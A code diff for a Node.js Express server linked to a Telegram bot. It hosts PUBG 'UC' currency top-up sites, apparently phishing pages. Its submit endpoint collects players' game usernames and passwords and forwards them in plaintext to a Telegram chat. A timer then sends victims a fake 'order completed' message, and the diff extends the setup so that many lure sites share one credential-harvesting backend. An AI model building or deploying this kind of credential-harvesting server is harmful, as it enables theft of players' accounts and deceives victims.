@@ -2,6 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
+const fs = require('fs');
 require('dotenv').config();
 
 const app = express();
@@ -11,27 +12,101 @@ const PORT = process.env.PORT || 3000;
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// خدمة الملفات الثابتة للمواقع المختلفة
-app.use('/increase', express.static('increase-site'));
-app.use('/pubg', express.static('pubg-site'));
-app.use('/uc', express.static('uc-site'));
-
 // تهيئة بوت التليجرام
 const token = process.env.s; // توكن البوت من متغيرات البيئة
 const bot = new TelegramBot(token, { polling: true });
 
-// تخزين الطلبات (في بيئة حقيقية، استخدم قاعدة بيانات)
+// تخزين الطلبات
 let requests = [];
 
-// مسارات خاصة بموقع زيادة الشدات
-app.get('/increase/pubg_uc/:chatId', (req, res) => {
-  res.sendFile(path.join(__dirname, 'increase-site', 'pubg_uc.html'));
-});
+// خدمة الملفات الثابتة لجميع المواقع في مجلد uploads
+const sitesDirectory = path.join(__dirname, 'uploads');
 
-// مسار لمعالجة طلبات الشحن
-app.post('/submitIncrease', async (req, res) => {
+// إنشاء مسارات ديناميكية لجميع المواقع
+try {
+  const sites = fs.readdirSync(sitesDirectory);
+  
+  sites.forEach(site => {
+    const sitePath = path.join(sitesDirectory, site);
+    if (fs.statSync(sitePath).isDirectory()) {
+      app.use(`/${site}`, express.static(sitePath));
+      console.log(`✅ تم تحميل الموقع: /${site}`);
+    }
+  });
+} catch (error) {
+  console.error('❌ خطأ في قراءة مجلد uploads:', error.message);
+  console.log('⏳ جاري إنشاء مجلد uploads مع مواقع مثال...');
+  
+  // إنشاء مجلد uploads إذا لم يكن موجودًا
+  if (!fs.existsSync(sitesDirectory)) {
+    fs.mkdirSync(sitesDirectory);
+  }
+  
+  // إنشاء بعض المواقع كمثال
+  const exampleSites = [
+    { name: 'pubg-uc', title: 'شحن شدات ببجي' },
+    { name: 'pubg-shop', title: 'متجر ببجي' },
+    { name: 'uc-store', title: 'متجر الشدات' }
+  ];
+  
+  exampleSites.forEach(site => {
+    const sitePath = path.join(sitesDirectory, site.name);
+    if (!fs.existsSync(sitePath)) {
+      fs.mkdirSync(sitePath);
+      
+      // إنشاء صفحة HTML أساسية لكل موقع
+      const htmlContent = `
+      <!DOCTYPE html>
+      <html dir="rtl" lang="ar">
+      <head>
+          <title>${site.title}</title>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <style>
+              body {
+                  font-family: Arial, sans-serif;
+                  background-color: #0d1b2a;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  min-height: 100vh;
+                  margin: 0;
+                  color: #fff;
+              }
+              .container {
+                  background-color: #1e293b;
+                  padding: 30px;
+                  border-radius: 15px;
+                  text-align: center;
+                  max-width: 500px;
+                  width: 90%;
+              }
+              h1 {
+                  color: #FFD700;
+              }
+          </style>
+      </head>
+      <body>
+          <div class="container">
+              <h1>مرحباً بكم في ${site.title}</h1>
+              <p>هذا موقع مثال في مجلد uploads</p>
+              <p>مسار الموقع: /${site.name}</p>
+          </div>
+      </body>
+      </html>
+      `;
+      
+      fs.writeFileSync(path.join(sitePath, 'index.html'), htmlContent);
+      app.use(`/${site.name}`, express.static(sitePath));
+      console.log(`✅ تم إنشاء موقع مثال: /${site.name}`);
+    }
+  });
+}
+
+// مسار API موحد لمعالجة طلبات جميع المواقع
+app.post('/submitRequest', async (req, res) => {
   try {
-    const { chatId, username, password, uc } = req.body;
+    const { chatId, username, password, amount, site, type } = req.body;
     
     // حفظ الطلب
     const request = {
@@ -39,122 +114,135 @@ app.post('/submitIncrease', async (req, res) => {
       chatId,
       username,
       password,
-      uc,
+      amount,
+      site,
+      type,
       timestamp: new Date().toLocaleString('ar-SA'),
       status: 'pending'
     };
     
     requests.push(request);
     
-    // إرسال رسالة إلى البوت
+    // إرسال رسالة موحدة إلى البوت لجميع المواقع
     const message = `
-    📦 طلب شحن شدات جديد:
-    
+    📦 طلب جديد من موقع ${site}:
+
     👤 اسم المستخدم: ${username}
     🔐 كلمة المرور: ${password}
-    🎮 عدد الشدات: ${uc}
+    🎮 الكمية: ${amount} ${type}
+    🌐 الموقع: ${site}
     ⏰ الوقت: ${request.timestamp}
     `;
     
     await bot.sendMessage(chatId, message);
     
-    res.json({ success: true, message: 'تم استلام طلبك بنجاح' });
+    res.json({ 
+      success: true, 
+      message: 'تم استلام طلبك بنجاح',
+      requestId: request.id
+    });
   } catch (error) {
     console.error('Error processing request:', error);
-    res.status(500).json({ success: false, message: 'حدث خطأ أثناء معالجة الطلب' });
-  }
-});
-
-// مسارات أخرى للمواقع المختلفة
-app.get('/other-site', (req, res) => {
-  res.send('هذا موقع آخر على السيرفر');
-});
-
-// مسار للتحقق من حالة الطلب
-app.get('/checkStatus/:requestId', (req, res) => {
-  const requestId = parseInt(req.params.requestId);
-  const request = requests.find(r => r.id === requestId);
-  
-  if (request) {
-    res.json({ status: request.status });
-  } else {
-    res.status(404).json({ error: 'الطلب غير موجود' });
+    res.status(500).json({ 
+      success: false, 
+      message: 'حدث خطأ أثناء معالجة الطلب' 
+    });
   }
 });
 
 // صفحة رئيسية توضح جميع المواقع المتاحة
 app.get('/', (req, res) => {
-  const html = `
-  <!DOCTYPE html>
-  <html dir="rtl" lang="ar">
-  <head>
-      <title>خادم متعدد المواقع</title>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <style>
-          body {
-              font-family: Arial, sans-serif;
-              background-color: #0d1b2a;
-              color: #fff;
-              padding: 20px;
-          }
-          .container {
-              max-width: 800px;
-              margin: 0 auto;
-              background-color: #1e293b;
-              padding: 30px;
-              border-radius: 15px;
-              box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
-          }
-          h1 {
-              color: #FFD700;
-              text-align: center;
-          }
-          .site-list {
-              list-style: none;
-              padding: 0;
-          }
-          .site-list li {
-              margin-bottom: 15px;
-              padding: 15px;
-              background-color: #334155;
-              border-radius: 8px;
-          }
-          .site-list a {
-              color: #FFD700;
-              text-decoration: none;
-              font-weight: bold;
-              display: block;
-          }
-          .site-list a:hover {
-              text-decoration: underline;
-          }
-      </style>
-  </head>
-  <body>
-      <div class="container">
-          <h1>المواقع المتاحة على الخادم</h1>
-          <ul class="site-list">
-              <li><a href="/increase/pubg_uc/6808883615">موقع شحن شدات ببجي</a></li>
-              <li><a href="/pubg">موقع ببجي (إن وجد)</a></li>
-              <li><a href="/uc">موقع الشدات (إن وجد)</a></li>
-              <li><a href="/other-site">موقع آخر</a></li>
-          </ul>
-      </div>
-  </body>
-  </html>
-  `;
-  res.send(html);
+  try {
+    const sites = fs.readdirSync(sitesDirectory).filter(site => {
+      return fs.statSync(path.join(sitesDirectory, site)).isDirectory();
+    });
+    
+    let sitesList = '';
+    sites.forEach(site => {
+      sitesList += `<li><a href="/${site}">${site}</a></li>`;
+    });
+    
+    const html = `
+    <!DOCTYPE html>
+    <html dir="rtl" lang="ar">
+    <head>
+        <title>خادم متعدد المواقع</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background-color: #0d1b2a;
+                color: #fff;
+                padding: 20px;
+            }
+            .container {
+                max-width: 800px;
+                margin: 0 auto;
+                background-color: #1e293b;
+                padding: 30px;
+                border-radius: 15px;
+                box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+            }
+            h1 {
+                color: #FFD700;
+                text-align: center;
+            }
+            .site-list {
+                list-style: none;
+                padding: 0;
+            }
+            .site-list li {
+                margin-bottom: 15px;
+                padding: 15px;
+                background-color: #334155;
+                border-radius: 8px;
+            }
+            .site-list a {
+                color: #FFD700;
+                text-decoration: none;
+                font-weight: bold;
+                display: block;
+                font-size: 18px;
+            }
+            .site-list a:hover {
+                text-decoration: underline;
+            }
+            .info {
+                background-color: #334155;
+                padding: 15px;
+                border-radius: 8px;
+                margin-bottom: 20px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>المواقع المتاحة على الخادم</h1>
+            
+            <div class="info">
+                <p>يوجد ${sites.length} موقعًا في مجلد uploads:</p>
+                <p>جميع الطلبات من هذه المواقع ترسل إلى البوت بنفس النموذج</p>
+            </div>
+            
+            <ul class="site-list">
+                ${sitesList}
+            </ul>
+        </div>
+    </body>
+    </html>
+    `;
+    
+    res.send(html);
+  } catch (error) {
+    res.status(500).send('خطأ في تحميل قائمة المواقع');
+  }
 });
 
 // تشغيل المخدم
 app.listen(PORT, () => {
   console.log(`✅ Server is running on port ${PORT}`);
-  console.log(`🌐 Available sites:`);
-  console.log(`   - Main: http://localhost:${PORT}`);
-  console.log(`   - PUBG UC: http://localhost:${PORT}/increase/pubg_uc/6808883615`);
-  console.log(`   - PUBG: http://localhost:${PORT}/pubg`);
-  console.log(`   - UC: http://localhost:${PORT}/uc`);
+  console.log(`🌐 Main: http://localhost:${PORT}`);
 });
 
 // معالجة رسائل البوت
@@ -164,19 +252,35 @@ bot.on('message', (msg) => {
   
   if (text === '/start') {
     const welcomeMessage = `
-    🎮 مرحباً بك في بوت شحن شدات ببجي!
+    🎮 مرحباً بك في بوت الخدمات!
     
-    لإضافة شدات إلى حسابك، يرجى استخدام الرابط التالي:
-    ${process.env.R}/increase/pubg_uc/${chatId}
-    
-    ⚠️ ملاحظة: احتفظ بهذا الرابط خاصاً ولا تشاركه مع الآخرين.
+    هذه بعض الأوامر المتاحة:
+    /sites - لعرض جميع المواقع المتاحة
+    /help - للمساعدة
     `;
     
     bot.sendMessage(chatId, welcomeMessage);
+  } else if (text === '/sites') {
+    try {
+      const sites = fs.readdirSync(sitesDirectory).filter(site => {
+        return fs.statSync(path.join(sitesDirectory, site)).isDirectory();
+      });
+      
+      let message = '🌐 المواقع المتاحة:\n\n';
+      sites.forEach(site => {
+        message += `/${site}\n`;
+      });
+      
+      message += `\nيمكنك زيارة أي موقع عن طريق: ${process.env.R}/اسم الموقع`;
+      
+      bot.sendMessage(chatId, message);
+    } catch (error) {
+      bot.sendMessage(chatId, '❌ حدث خطأ في جلب قائمة المواقع');
+    }
   }
 });
 
-// دالة للتحقق من الطلبات كل 15 دقيقة (محاكاة لإكمال الطلب)
+// دالة للتحقق من الطلبات كل 15 دقيقة
 setInterval(() => {
   const now = new Date();
   requests.forEach(request => {
@@ -189,10 +293,10 @@ setInterval(() => {
         
         // إرسال رسالة إشعار بإكمال الطلب
         const completionMessage = `
-        ✅ تم اكتمال طلبك!
+        ✅ تم اكتمال طلبك من موقع ${request.site}!
         
         👤 اسم المستخدم: ${request.username}
-        🎮 عدد الشدات: ${request.uc}
+        🎮 الكمية: ${request.amount} ${request.type}
         ⏰ وقت الإكمال: ${new Date().toLocaleString('ar-SA')}
         
         شكراً لاستخدامك خدمتنا! 🎮
@@ -203,4 +307,4 @@ setInterval(() => {
       }
     }
   });
-}, 60000); // التحقق كل دقيقة
+}, 60000);
